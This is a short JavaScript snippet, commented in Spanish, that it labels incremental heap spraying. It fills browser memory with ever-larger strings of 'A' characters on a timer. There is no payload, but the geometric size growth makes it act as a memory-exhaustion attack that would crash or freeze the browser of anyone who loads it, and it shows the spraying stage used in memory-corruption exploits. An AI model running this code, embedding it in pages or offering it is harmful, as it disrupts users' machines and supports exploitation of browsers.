(function() {
    const sprayArray = [];
    const baseObjectSize = 0x333333;  // Tamaño de cada bloque pequeño (~3 MB)
    const incrementFactor = 1.05;     // Factor de incremento para cada iteración
    const maxIterations = 1000;       // Aumentamos el número de iteraciones para impacto gradual
    let currentObjectSize = baseObjectSize;

    function incrementalSpray(iteration) {
        if (iteration >= maxIterations) {
            console.log("Heap spraying completado de forma incremental.");
            alert("Proceso de heap spraying finalizado.");
            return;
        }

        // Crear objeto con tamaño incremental
        let sprayObject = "A".repeat(Math.floor(currentObjectSize));
        sprayArray.push(sprayObject);

        console.log(`Iteración ${iteration + 1}: Tamaño actual del objeto: ${currentObjectSize.toString(16)}`);

        // Incrementar el tamaño del siguiente objeto
        currentObjectSize *= incrementFactor;

        // Liberación parcial cada 100 iteraciones
        if (iteration % 100 === 0 && iteration !== 0) {
            console.log(`Liberando memoria parcialmente en iteración ${iteration}`);
            sprayArray.splice(0, 25); // Liberación parcial de los objetos más antiguos
        }

        // Ejecutar siguiente iteración después de una breve pausa
        setTimeout(() => incrementalSpray(iteration + 1), 50); // Pausa de 50 ms entre cada incremento
    }

    incrementalSpray(0);
})();
